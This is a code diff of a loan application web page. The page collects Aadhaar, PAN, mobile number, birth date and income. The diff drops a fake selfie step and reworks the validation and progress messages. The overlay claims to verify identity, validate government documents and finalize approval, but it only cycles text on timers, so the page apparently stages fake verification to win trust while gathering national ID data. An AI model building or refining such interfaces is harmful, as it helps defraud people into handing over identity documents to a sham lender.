@@ -60,7 +60,6 @@
 
         .error-input { border: 2px solid var(--error-red) !important; }
 
-        /* Radio Buttons for Gender/Occupation */
         .radio-group {
             display: flex;
             justify-content: space-between;
@@ -92,25 +91,6 @@
         }
         .input-with-icon input { padding-left: 25px; }
 
-        /* Selfie Button */
-        #selfie-btn {
-            width: 100%;
-            padding: 15px;
-            background-color: var(--light-blue);
-            border: 2px dashed var(--primary-blue);
-            color: var(--primary-blue);
-            font-weight: bold;
-            border-radius: 8px;
-            cursor: pointer;
-            margin-bottom: 15px;
-        }
-        #selfie-btn.completed {
-            background-color: var(--grey);
-            border-color: #999;
-            color: #666;
-            cursor: not-allowed;
-        }
-
         /* Submit Button */
         #submit-btn {
             width: 100%;
@@ -122,10 +102,10 @@
             font-size: 12pt;
             font-weight: bold;
             cursor: not-allowed;
-            transition: 0.3s;
+            transition: background-color 0.3s ease;
         }
         #submit-btn.enabled {
-            background-color: var(--primary-blue);
+            background-color: var(--primary-blue) !important;
             cursor: pointer;
         }
 
@@ -247,8 +227,6 @@
             </div>
         </div>
 
-        <button id="selfie-btn" onclick="takeSelfie()">Attach Your Selfie</button>
-
         <div style="display: flex; align-items: flex-start; gap: 10px; margin-bottom: 20px;">
             <input type="checkbox" id="agree" style="width: 20px; height: 20px;" onchange="validateForm()">
             <label style="font-weight: normal; font-size: 9pt; line-height: 1.4;">
@@ -266,12 +244,18 @@
     </div>
 
     <script>
-        let selfieDone = false;
+        // Store selected values for radio groups
+        let selectedGender = '';
+        let selectedEmp = '';
 
         function selectItem(type, element) {
             const parent = element.parentElement;
             parent.querySelectorAll('.radio-item').forEach(i => i.classList.remove('active'));
             element.classList.add('active');
+            
+            if(type === 'gender') selectedGender = element.innerText;
+            if(type === 'emp') selectedEmp = element.innerText;
+            
             validateForm();
         }
 
@@ -283,48 +267,43 @@
             return num.length === 12 && !/^(.)\1+$/.test(num);
         }
 
-        function takeSelfie() {
-            if(selfieDone) return;
-            const btn = document.getElementById('selfie-btn');
-            btn.innerText = "Opening Camera...";
-            setTimeout(() => {
-                btn.innerText = "Processing Selfie...";
-                setTimeout(() => {
-                    selfieDone = true;
-                    btn.innerText = "Selfie Attached ✅";
-                    btn.classList.add('completed');
-                    validateForm();
-                }, 5000);
-            }, 1000);
-        }
-
         function validateForm() {
-            const fName = document.getElementById('first-name').value;
-            const lName = document.getElementById('last-name').value;
+            const fName = document.getElementById('first-name').value.trim();
+            const lName = document.getElementById('last-name').value.trim();
+            const mobile = document.getElementById('mobile').value;
+            const aadhar = document.getElementById('aadhar').value;
+            const pan = document.getElementById('pan').value.toUpperCase();
+            const dob = document.getElementById('dob').value;
             const incomeVal = parseInt(document.getElementById('income').value) || 0;
             const loanAmountVal = parseInt(document.getElementById('loan-amount').value) || 0;
-            
+            const loanType = document.getElementById('loan-type').value;
+            const loanPurpose = document.getElementById('loan-purpose').value;
+            const isAgreed = document.getElementById('agree').checked;
+
             const maxAllowedLoan = incomeVal * 5;
 
-            const isName = fName.length >= 2 && lName.length >= 2;
-            const isMobile = document.getElementById('mobile').value.length === 10;
-            const isAadhar = isValidAadhar(document.getElementById('aadhar').value);
-            const isPan = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(document.getElementById('pan').value);
-            const isIncome = incomeVal >= 10000 && incomeVal <= 80000;
-            const isAmount = loanAmountVal >= 10000 && loanAmountVal <= 500000 && loanAmountVal <= maxAllowedLoan;
-            const isAgreed = document.getElementById('agree').checked;
-            
+            // Strict Validations
+            const isNameValid = fName.length >= 2 && lName.length >= 2;
+            const isMobileValid = mobile.length === 10;
+            const isAadharValid = isValidAadhar(aadhar);
+            const isPanValid = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(pan);
+            const isIncomeValid = incomeVal >= 10000 && incomeVal <= 80000;
+            const isAmountValid = loanAmountVal >= 10000 && loanAmountVal <= 500000 && loanAmountVal <= maxAllowedLoan;
+            const isRadioValid = selectedGender !== '' && selectedEmp !== '';
+            const isDropdownValid = loanType !== '' && loanPurpose !== '';
+
             const btn = document.getElementById('submit-btn');
 
-            // Visual feedback for loan limit
+            // Amount limit check visual feedback
             if(loanAmountVal > maxAllowedLoan && incomeVal >= 10000) {
                 document.getElementById('loan-amount').classList.add('error-input');
-                vibrate();
             } else {
                 document.getElementById('loan-amount').classList.remove('error-input');
             }
 
-            if (isName && isMobile && isAadhar && isPan && isIncome && isAmount && isAgreed && selfieDone) {
+            // Final Enable Check
+            if (isNameValid && isMobileValid && isAadharValid && isPanValid && dob !== '' && 
+                isIncomeValid && isAmountValid && isRadioValid && isDropdownValid && isAgreed) {
                 btn.classList.add('enabled');
                 return true;
             } else {
@@ -334,13 +313,15 @@
         }
 
         function startProcessing() {
-            if (!validateForm()) return;
+            if (!validateForm()) {
+                vibrate();
+                return;
+            }
 
             const firstName = document.getElementById('first-name').value;
             const lastName = document.getElementById('last-name').value;
             const loanAmount = document.getElementById('loan-amount').value;
             
-            // Storage for next page
             localStorage.setItem('userName', firstName + " " + lastName);
             localStorage.setItem('userLoanAmount', loanAmount);
 
@@ -349,11 +330,11 @@
             overlay.style.display = 'flex';
 
             const steps = [
-                "Verifying name: " + firstName + " " + lastName + "...",
-                "Validating Aadhaar authentication...",
-                "Checking PAN link records...",
-                "Calculating credit limit for ₹" + loanAmount + "...",
-                "Finalizing your approval..."
+                "Verifying identity records...",
+                "Validating government documentation...",
+                "Checking credit history link...",
+                "Calculating eligible limit for ₹" + loanAmount + "...",
+                "Finalizing limit approval..."
             ];
 
             let i = 0;
@@ -368,9 +349,10 @@
             }, 3000);
         }
 
-        // Event listeners for inputs
-        document.querySelectorAll('input').forEach(input => {
-            input.addEventListener('input', validateForm);
+        // Attach listeners to all inputs for real-time button activation
+        document.querySelectorAll('input, select').forEach(element => {
+            element.addEventListener('input', validateForm);
+            element.addEventListener('change', validateForm);
         });
     </script>
 </body>
